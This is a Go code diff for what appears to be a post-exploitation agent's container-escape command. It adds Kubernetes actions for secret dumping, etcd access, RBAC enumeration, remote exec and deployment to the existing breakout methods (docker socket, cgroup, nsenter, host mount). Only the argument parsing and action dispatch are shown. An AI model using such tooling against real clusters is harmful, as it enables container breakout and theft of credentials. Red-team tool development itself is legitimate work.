@@ -26,16 +26,17 @@ func (c *ContainerEscapeCommand) Description() string {
 }
 
 type containerEscapeArgs struct {
-	Action  string `json:"action"`
-	Command string `json:"command"`
-	Image   string `json:"image"`
-	Path    string `json:"path"`
+	Action     string `json:"action"`
+	Command    string `json:"command"`
+	Image      string `json:"image"`
+	Path       string `json:"path"`
+	Kubeconfig string `json:"kubeconfig"`
 }
 
 func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResult {
-	var args containerEscapeArgs
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Failed to parse arguments: %v", err)
+	args, parseErr := requireParams[containerEscapeArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Action == "" {
@@ -56,8 +57,22 @@ func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResul
 		output, status = escapeNsenter(args.Command)
 	case "mount-host":
 		output, status = escapeMountHost(args.Path)
+	case "k8s-enum":
+		output, status = escapeK8sEnum(args)
+	case "k8s-secrets":
+		output, status = escapeK8sSecrets(args)
+	case "k8s-deploy":
+		output, status = escapeK8sDeploy(args)
+	case "k8s-exec":
+		output, status = escapeK8sExec(args)
+	case "k8s-rbac":
+		output, status = escapeK8sRBAC(args)
+	case "k8s-nodes":
+		output, status = escapeK8sNodes(args)
+	case "k8s-etcd":
+		output, status = escapeK8sEtcd(args)
 	default:
-		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host", args.Action)
+		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host, k8s-enum, k8s-secrets, k8s-rbac, k8s-nodes, k8s-etcd, k8s-deploy, k8s-exec", args.Action)
 		status = "error"
 	}
 
